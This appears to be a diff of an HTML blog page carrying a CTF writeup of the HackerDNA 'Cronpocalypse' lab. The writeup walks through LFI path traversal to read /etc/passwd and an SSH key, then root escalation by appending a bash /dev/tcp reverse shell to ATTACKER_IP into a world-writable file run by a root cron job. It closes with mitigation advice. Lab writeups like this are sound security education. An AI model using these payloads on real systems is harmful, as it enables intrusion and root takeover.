@@ -3,90 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cronpocalypse CTF – LFI to Root | Writeup</title>
+    <title>Cronpocalypse CTF – Web LFI to Root | Syed Mujtaba</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="../../css/blog.css">
-    <style>
-        .post-body h2 { color: #00ff88; margin-top: 1.8rem; }
-        pre { background: #0f1222; padding: 1rem; border-radius: 12px; border-left: 3px solid #00ffff; }
-        code { color: #00ff88; background: rgba(0,255,255,0.1); padding: 0.2rem 0.4rem; border-radius: 6px; }
-        .tag { background: rgba(0,255,255,0.2); padding: 0.2rem 0.8rem; border-radius: 20px; display: inline-block; margin-right: 0.5rem; color: #00ffff; }
-        .back-blog { display: inline-block; margin-top: 2rem; background: rgba(0,255,255,0.1); border: 1px solid #00ffff; padding: 0.5rem 1.2rem; border-radius: 40px; color: #00ffff; text-decoration: none; }
-        .back-blog:hover { background: #00ffff; color: #0a0e27; }
-    </style>
+    <!-- Tumhari external CSS -->
+    <link rel="stylesheet" href="../../css/tutorial.css">
 </head>
 <body>
 <div class="container">
     <div class="blog-header">
-        <h1><i class="fas fa-flag-checkered"></i> Cronpocalypse – Web LFI to Root Privilege Escalation</h1>
+        <h1><i class="fas fa-flag-checkered"></i> Cronpocalypse – Web LFI to Root</h1>
         <p>CTF Writeup | HackerDNA Lab</p>
-        <a href="../main_page_blog.html" class="back-home"><i class="fas fa-arrow-left"></i> Back to Blogs</a>
+        <a href="../main_page_blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Blogs</a>
     </div>
 
-    <div class="tags">
+    <div class="post-tags">
         <span class="tag">🏴 CTF</span>
-        <span class="tag">🐞 LFI</span>
+        <span class="tag">🐞 Local File Inclusion</span>
         <span class="tag">⏱️ Cron Job</span>
         <span class="tag">🔑 Privilege Escalation</span>
     </div>
 
-    <div class="post-body">
+    <div class="blog-meta-line">
+        <span><i class="far fa-calendar-alt"></i> April 2026</span>
+        <span><i class="fas fa-user-astronaut"></i> Syed Mujtaba Zaidi</span>
+        <span><i class="fas fa-graduation-cap"></i> BS Cyber Security, Riphah</span>
+    </div>
+
+    <div class="blog-content">
         <p><strong>Lab Reference:</strong> <a href="https://hackerdna.com/labs/cronpocalypse" target="_blank">https://hackerdna.com/labs/cronpocalypse</a></p>
-        
-        <p>This writeup describes the complete attack chain for the Cronpocalypse lab on HackerDNA. The goal was to go from a vulnerable web application to full root access using a combination of Local File Inclusion (LFI), credential harvesting, and cron job abuse.</p>
+        <p>This writeup covers the complete attack chain for <strong>Cronpocalypse</strong> – from a Local File Inclusion vulnerability to root privilege escalation via a misconfigured cron job.</p>
 
         <h2>🔍 Reconnaissance</h2>
-        <p>Nmap scan revealed two open ports:</p>
         <pre><code>nmap -sC -sV 10.10.10.10</code></pre>
-        <ul>
-            <li>Port 80 – Python web app (Werkzeug)</li>
-            <li>Port 22 – OpenSSH</li>
-        </ul>
+        <p>Open ports: 80 (Python web app / Werkzeug) and 22 (OpenSSH).</p>
 
-        <h2>🌐 Web Vulnerability – LFI</h2>
-        <p>The "Features" page had a parameter <code>page</code> that loaded local files. Testing with:</p>
+        <h2>🌐 LFI Discovery</h2>
+        <p>The "Features" page had a <code class="inline-code">page</code> parameter vulnerable to Local File Inclusion:</p>
         <pre><code>http://10.10.10.10/features?page=../../../../etc/passwd</code></pre>
-        <p>This successfully returned the system's passwd file, confirming a Local File Inclusion vulnerability.</p>
+        <p>This returned system files, and further enumeration revealed an SSH private key for a low-privileged user.</p>
 
-        <h2>🔑 Credential Harvesting & SSH Access</h2>
-        <p>Using the LFI, I read sensitive files and discovered an SSH private key for a low-privileged user. After saving the key and setting correct permissions, I established an SSH session:</p>
-        <pre><code>ssh user@10.10.10.10 -i id_rsa</code></pre>
-        <p>The first flag was found in the user's home directory.</p>
+        <h2>🔑 SSH Access & First Flag</h2>
+        <pre><code>chmod 600 id_rsa
+ssh user@10.10.10.10 -i id_rsa</code></pre>
+        <p>First flag was found in the user's home directory (content omitted per writeup guidelines).</p>
 
-        <h2>⏱️ Privilege Escalation via Cron Job</h2>
-        <p>System enumeration revealed a cron job running every minute as root:</p>
+        <h2>⏱️ Privilege Escalation – Cron Job Abuse</h2>
+        <p>System inspection showed a cron job running every minute as root:</p>
+        <pre><code>cat /etc/crontab</code></pre>
         <pre><code>* * * * * root /usr/local/bin/backup.sh</code></pre>
-        <p>The script <code>/usr/local/bin/backup.sh</code> sourced a file from <code>/tmp/config.sh</code>, which was world-writable. This misconfiguration allowed any user to modify the script executed by root.</p>
+        <p>The script <code class="inline-code">/usr/local/bin/backup.sh</code> sourced <code class="inline-code">/tmp/config.sh</code>, which was world‑writable. This misconfiguration allowed any user to modify the script executed by root.</p>
 
         <h2>💣 Exploitation</h2>
-        <p>I appended a reverse shell payload to <code>/tmp/config.sh</code>:</p>
+        <p>A reverse shell payload was appended to <code class="inline-code">/tmp/config.sh</code>:</p>
         <pre><code>echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /tmp/config.sh</code></pre>
-        <p>After setting up a netcat listener, the cron job executed within a minute, returning a root reverse shell. The final flag was retrieved from <code>/root</code>.</p>
+        <p>Netcat listener on attacker machine:</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <p>Within one minute, the cron job executed the script as root, returning a root reverse shell. The final flag was retrieved from <code class="inline-code">/root/root.txt</code>.</p>
 
-        <h2>🧠 Key Learnings & Mitigations</h2>
-        <ul>
-            <li>✅ Validate all user input – LFI can lead to full compromise.</li>
-            <li>✅ Never store credentials or private keys in accessible files.</li>
-            <li>✅ Avoid running cron jobs as root if possible, and never execute writable scripts from world-accessible directories.</li>
-            <li>✅ Regular system audits for misconfigurations.</li>
-        </ul>
+        <div class="note-box">
+            🧠 <strong>Key Takeaways:</strong><br>
+            • Always validate user input – LFI can lead to full compromise.<br>
+            • Never store credentials or private keys in web‑accessible locations.<br>
+            • Root cron jobs must never execute writable scripts from world‑writable directories.<br>
+            • Regular system auditing prevents privilege escalation.
+        </div>
 
         <h2>🛠️ Tools Used</h2>
         <ul>
             <li>Nmap</li>
-            <li>Browser / Burp Suite</li>
+            <li>Burp Suite / Browser DevTools</li>
             <li>SSH</li>
             <li>Netcat</li>
-            <li>Linux command line</li>
+            <li>Linux command line (crontab, echo, cat, chmod)</li>
         </ul>
 
-        <p>This lab provided a realistic chain of vulnerabilities – from web LFI to root cron abuse – highlighting the importance of defense in depth.</p>
-
-        <a href="../main_page_blog.html" class="back-blog"><i class="fas fa-arrow-left"></i> Back to Blog Home</a>
+        <p>This lab demonstrates a realistic attack chain – from web LFI to root cron abuse – highlighting the importance of secure coding and system hardening.</p>
     </div>
-    <div class="footer">
-        <i class="fas fa-laptop-code"></i> Syed Mujtaba Zaidi – Ethical Hacking & Cybersecurity
+
+    <div class="blog-footer">
+        <a href="../main_page_blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to all blogs</a>
     </div>
 </div>
 </body>
